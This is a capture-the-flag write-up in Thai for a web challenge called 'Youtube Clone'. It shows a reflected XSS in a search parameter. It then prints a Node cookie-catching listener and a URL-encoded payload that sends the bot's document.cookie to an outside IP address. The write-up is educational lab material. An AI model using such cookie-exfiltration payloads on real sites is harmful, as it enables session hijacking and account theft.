---
title: Youtube Clone
description: "In this challenge, there is a bot that automatically reads and clicks links on a YouTube page. The bot operates on the page as a regular user, and you are tasked with finding a way to steal the bot's cookies in order to capture the flag."
category: 'Web'
---


# เนื่องจากในเวป Youtube Clone มี 2 ฟีเจอร์หลักๆ คือ 

1. การคอมเม้นท์ ซึ่งเราสามารถใช้การคอมเม้นท์ที่เป็น url เวปจำทำการแปลงเป็น แท็ก <a></a> ให้ ทำให้บอทสามารถเห็น url ที่เราคอมเม้นท์ไปได้ บอทจะสามารถกดลิงก์เข้าไปได้ เช่น ลองคอมเม้นท์ไปว่า

```text
https://www.google.com
```

2.การใช้ query ในหน้า 

```text
localhost/explore.php?search=
```

เมื่อลองทดสอบ reflected xss โดยการเข้า url

```text
localhost/explore.php?search=<script>alert('hi')</script>
```

พบว่าสามารถใช้ XSS ตรงนี้ได้ จะมีการแจ้งเตือนว่า "hi"




# คราวนี้ถึงคราวการสร้าง payload ขึ้นมาแล้ว 

เป้าหมายของการสร้าง payload คือเพื่อดึงข้อมูล cookie จาก bot ที่ทำการคลิ้ก url ในคอมเม้นท์

วิธีการของเราคือต้องเปิดพอร์ตสำหรับ listener คุกกี้และใช้ payload ที่จะดึงคุกกี้ส่งมาในพอร์ตของเรา



script เพื่อรอดักรับ cookies 

```javascript
var express = require('express');
var app = express();

app.use(function(req, res, next) {
	// Allows CORS requests:
	res.header('Access-Control-Allow-Origin', '*');
	next();
});

app.get('/cookie', function(req, res, next) {
	console.log('GET /cookie');
	console.log(req.query.data);
	res.send('Thanks!');
});

app.get('/keys', function(req, res, next) {
	console.log('GET /keys');
	console.log(req.query.data);
	res.send('I\'ll try to remember that..');
});

app.listen(3001, function() {
	console.log('"Evil" server listening at localhost:3001');
});
```

script สำหรับเอาไปทำเป็น Payload เพื่อใส่ไปใน comment 

```javascript
var img = document.createElement('img');
img.src = 'http://172.16.69.66:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```

ip address เปลี่ยนให้เป็นของเครื่องที่ออกเนต



นำ Payload ไปทำเป็น url เพื่อที่จะยัดใส่ comment section 

```text
http://localhost/explore.php?search=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2F172.16.69.66%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E
```




# สุดท้าย

ให้นำ payload ไปใส่ใน comment เพื่อให้บอทกดคลิ้กลิงก์ของเรา

รัน script ที่เอาไว้ดักรับ cookies 

รอบอทคลิ้กไปที่ลิงก์ แล้ว flag ก็จะเจอได้ใน script ที่เรารอดักรับเอาไว้

